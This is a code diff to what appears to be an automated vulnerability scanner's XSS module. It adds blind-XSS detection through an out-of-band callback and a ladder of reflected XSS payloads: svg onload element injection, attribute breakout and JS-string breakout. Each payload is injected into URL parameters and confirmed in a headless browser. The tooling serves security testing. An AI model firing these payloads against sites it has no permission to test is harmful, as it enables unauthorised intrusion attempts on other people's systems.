@@ -6,9 +6,15 @@ import secrets
 from urllib.parse import parse_qsl, urlparse
 
 from core.validators import inject_param
+from core.verification_oracle import looks_unsanitized
 from modules.base import BaseModule
 from tools.external import dalfox_scan, tool_available
 from tools.wrappers import curl
+
+
+# Backward-compatible alias: the shared oracle lives in core now.
+def _looks_unsanitized(body: str, payload: str, marker: str) -> bool:
+    return looks_unsanitized(body, payload, marker)
 
 
 class XSSScan(BaseModule):
@@ -37,10 +43,22 @@ class XSSScan(BaseModule):
                 internal_findings.append(finding)
 
         dalfox_findings = []
+        blind_callback = None
+        oob_client = self.oob()
         if tool_available("dalfox"):
+            blind_url = None
+            if oob_client is not None:
+                try:
+                    corr_id = await oob_client.register_callback(
+                        f"xss-blind:{self.domain}")
+                    blind_url = oob_client.callback_url(corr_id, "/xss")
+                    blind_callback = corr_id
+                except Exception as exc:
+                    self.log(f"  OOB registration failed, blind pass skipped: {exc}")
             result = await dalfox_scan(
                 [point["url"] for point in points[:max_points]],
                 timeout=int(cfg.get("dalfox_timeout", 600)),
+                blind=blind_url,
             )
             dalfox_findings = result.get("results", []) if result.get("available", True) else []
         else:
@@ -96,6 +114,36 @@ class XSSScan(BaseModule):
             if key in seen:
                 continue
             seen.add(key)
+            blind_hit = "blind" in str(item.get("type", "")).lower() or \
+                "blind" in str(item.get("evidence", "")).lower()
+            if blind_hit and blind_callback and oob_client is not None:
+                confirmed = await self._confirm_blind_callback(
+                    oob_client, blind_callback)
+            else:
+                confirmed = False
+            if blind_hit and confirmed:
+                self.state.add_finding(
+                    title="Confirmed Blind XSS via OOB Callback",
+                    severity="HIGH",
+                    confidence="CONFIRMED",
+                    category="XSS",
+                    description=(
+                        "A blind XSS payload phoned home to the out-of-band "
+                        "callback: JavaScript executed in a victim context "
+                        "(stored page, admin panel, or mail client)."),
+                    evidence=[
+                        str(item.get("url", "")),
+                        str(item.get("payload", "")),
+                        f"OOB callback received (corr {blind_callback[:8]})",
+                    ],
+                    evidence_refs=[evidence_id],
+                    asset_keys=[f"url:{item.get('url', '')}"],
+                    remediation="Encode output by context everywhere user input is stored or mailed, and enforce CSP.",
+                    verified=True,
+                    verification={"method": "oob_callback",
+                                  "url": str(item.get("url", ""))},
+                )
+                continue
             self.state.add_finding(
                 title="Dalfox XSS Candidate",
                 severity="HIGH",
@@ -119,6 +167,19 @@ class XSSScan(BaseModule):
         )
         return "done"
 
+    async def _confirm_blind_callback(self, oob_client, corr_id: str) -> bool:
+        """Poll for the blind payload's phone-home (bounded)."""
+        import asyncio as _asyncio
+        for _ in range(6):
+            try:
+                interactions = await oob_client.poll(corr_id)
+            except Exception:
+                interactions = []
+            if interactions:
+                return True
+            await _asyncio.sleep(oob_client.poll_interval)
+        return False
+
     async def _test_reflected_xss(self, point: dict, browser_available: bool) -> dict | None:
         url = point["url"]
         param = point["param"]
@@ -129,34 +190,42 @@ class XSSScan(BaseModule):
         if marker not in marker_body:
             return None
 
+        # Payload ladder: element injection first, then attribute breakout,
+        # then JS-string breakout. Each carries its own execution marker so
+        # a reflection of one payload can never confirm another.
         exec_marker = secrets.token_hex(4)
         expected = exec_marker * 2
-        payload = f"<sVg/onLOad=document.body.append(`{exec_marker}`.repeat(2))>"
-        payload_url = inject_param(url, param, payload)
-        payload_result = await curl(payload_url, output="full")
-        body = payload_result.get("body", "")
+        payloads = [
+            f"<sVg/onLOad=document.body.append(`{exec_marker}`.repeat(2))>",
+            f"\"><sVg/onLOad=document.body.append(`{exec_marker}`.repeat(2))>",
+            f"'-document.body.append(`{exec_marker}`.repeat(2))- appeals'",
+        ]
+        for payload in payloads:
+            payload_url = inject_param(url, param, payload)
+            payload_result = await curl(payload_url, output="full")
+            body = payload_result.get("body", "")
 
-        if browser_available:
-            executed = await _browser_confirms_execution(payload_url, expected, self.config)
-            if executed:
+            if browser_available:
+                executed = await _browser_confirms_execution(payload_url, expected, self.config)
+                if executed:
+                    return {
+                        "url": url,
+                        "param": param,
+                        "payload": payload,
+                        "test_url": payload_url,
+                        "confidence": "CONFIRMED",
+                        "evidence": f"Browser DOM contained execution marker {expected}",
+                    }
+
+            if _looks_unsanitized(body, payload, exec_marker):
                 return {
                     "url": url,
                     "param": param,
                     "payload": payload,
                     "test_url": payload_url,
-                    "confidence": "CONFIRMED",
-                    "evidence": f"Browser DOM contained execution marker {expected}",
+                    "confidence": "FIRM",
+                    "evidence": "Payload reflected with executable HTML/JS metacharacters unsanitized",
                 }
-
-        if _looks_unsanitized(body, payload, exec_marker):
-            return {
-                "url": url,
-                "param": param,
-                "payload": payload,
-                "test_url": payload_url,
-                "confidence": "FIRM",
-                "evidence": "Payload reflected with executable HTML/JS metacharacters unsanitized",
-            }
 
         return None
 
@@ -253,8 +322,12 @@ async def _browser_confirms_execution(url: str, expected: str, config: dict) -> 
             await page.goto(url, wait_until="networkidle", timeout=15000)
             await page.wait_for_timeout(500)
             text = await page.evaluate("() => document.body ? document.body.textContent : ''")
+            # textContent misses execution that leaves no text behind
+            # (cookie exfil, alert-only, DOM rewrites): innerHTML catches
+            # the marker's residue in those shapes.
+            inner = await page.evaluate("() => document.documentElement ? document.documentElement.innerHTML : ''")
         except Exception:
             await browser.close()
             return False
         await browser.close()
-    return expected in (text or "")
+    return expected in (text or "") or expected in (inner or "")
